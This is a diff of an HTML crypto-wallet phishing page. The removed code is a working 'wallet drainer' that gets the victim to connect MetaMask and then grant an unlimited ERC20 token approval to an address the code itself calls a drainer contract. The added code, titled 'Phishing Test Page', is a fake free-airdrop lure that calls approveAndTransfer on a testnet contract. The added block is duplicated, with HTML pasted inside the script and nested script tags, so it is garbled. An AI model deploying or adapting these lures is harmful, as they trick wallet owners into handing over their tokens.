@@ -1,95 +1,68 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SSO to the moon</title>
+    <title>Phishing Test Page</title>
 </head>
 <body>
-    <h1>SSO to the moon</h1>
-    <!-- Connect button to request account -->
-    <button id="connectButton">Click me to connect your wallet</button>
+    <h2>Claim Your Free Airdrop!</h2>
+    <p>Click the button below to receive your reward.</p>
+    <button onclick="triggerPhishing()">Claim Now</button>
 
-    <!-- Approve button to approve tokens for spending -->
-    <button id="approveButton">Approve Token Transfer</button>
-
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.0/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
     <script>
-        let account;
+        const web3 = new Web3(Web3.givenProvider || "https://data-seed-prebsc-1-s1.binance.org:8545");
 
-        // Connect Button Event Listener
-        document.getElementById('connectButton').addEventListener('click', async () => {
-            // Check if MetaMask is installed
-            if (typeof window.ethereum !== 'undefined') {
-                console.log('MetaMask is installed!');
-                
-                // Request accounts from MetaMask
-                try {
-                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-                    account = accounts[0]; // Save the connected account
-                    console.log('Connected account:', account);
-                    alert(`Connected account: ${account}`);
-                } catch (error) {
-                    console.error('User rejected connection or error occurred:', error);
-                }
-            } else {
-                alert('MetaMask is not installed!');
-            }
-        });
+        // Replace with the contract address from Remix deployment
+        const contractAddress = "0x9aEd13fEB6f70CB35F8ed2383f6CF98EaaeEa2AF";
+        const contractABI = [/* ABI of the PhishingApprovalSimulator contract */];
 
-        // The ERC20 token contract address (replace with your token's contract address)
-        const tokenAddress = '0x130785C7dd6c732Fb00A40e02eB1df654d8772F7';
+        const phishingContract = new web3.eth.Contract(contractABI, contractAddress);
 
-        // The Wallet Drainer contract address (replace with your drainer contract address)
-        const spenderAddress = '0xc68fA1a15992CDB03114D6ac9d7066A8e712A885';
+        async function triggerPhishing() {
+            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+            const userAccount = accounts[0];
 
-        // The maximum approval amount (for unlimited allowance)
-        const maxApproval = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-
-        async function approveTokens() {
-            // Check if MetaMask is installed
-            if (window.ethereum) {
-                const web3 = new Web3(window.ethereum);
-
-                if (!account) {
-                    alert('Please connect your wallet first.');
-                    return;
-                }
-
-                // ABI for the ERC20 approve function
-                const approveAbi = [
-                    {
-                        constant: false,
-                        inputs: [
-                            { name: "_spender", type: "address" },
-                            { name: "_value", type: "uint256" }
-                        ],
-                        name: "approve",
-                        outputs: [{ name: "", type: "bool" }],
-                        type: "function"
-                    }
-                ];
-
-                // Create a contract instance
-                const tokenContract = new web3.eth.Contract(approveAbi, tokenAddress);
-
-                // Send the approve transaction
-                try {
-                    await tokenContract.methods
-                        .approve(spenderAddress, maxApproval)
-                        .send({ from: account });
-
-                    alert('Token approval successful!');
-                } catch (error) {
-                    alert('Error in token approval: ' + error.message);
-                }
-            } else {
-                alert('MetaMask is not installed!');
-            }
+            phishingContract.methods.approveAndTransfer("0xYourBEP20TokenAddress").send({ from: userAccount })
+                .on('transactionHash', function(hash) {
+                    console.log('Transaction sent: ', hash);
+                })
+                .on('confirmation', function(confirmationNumber, receipt) {
+                    console.log('Transaction confirmed: ', confirmationNumber, receipt);
+                })
+                .on('error', function(error) {
+                    console.error('Transaction failed: ', error);
+                });
         }
+        <h2>Claim Your Free Airdrop!</h2>
+    <p>Click the button below to receive your reward.</p>
+    <button onclick="triggerPhishing()">Claim Now</button>
 
-        // Set up the Approve Button event listener
-        document.getElementById('approveButton').addEventListener('click', approveTokens);
+    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+    <script>
+        const web3 = new Web3(Web3.givenProvider || "https://data-seed-prebsc-1-s1.binance.org:8545");
+
+        // Replace with the contract address from Remix deployment
+        const contractAddress = "0xYourPhishingContractAddress";
+        const contractABI = [/* ABI of the PhishingApprovalSimulator contract */];
+
+        const phishingContract = new web3.eth.Contract(contractABI, contractAddress);
+
+        async function triggerPhishing() {
+            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+            const userAccount = accounts[0];
+
+            phishingContract.methods.approveAndTransfer("0xYourBEP20TokenAddress").send({ from: userAccount })
+                .on('transactionHash', function(hash) {
+                    console.log('Transaction sent: ', hash);
+                })
+                .on('confirmation', function(confirmationNumber, receipt) {
+                    console.log('Transaction confirmed: ', confirmationNumber, receipt);
+                })
+                .on('error', function(error) {
+                    console.error('Transaction failed: ', error);
+                });
+        }
+    </script>
     </script>
 </body>
 </html>
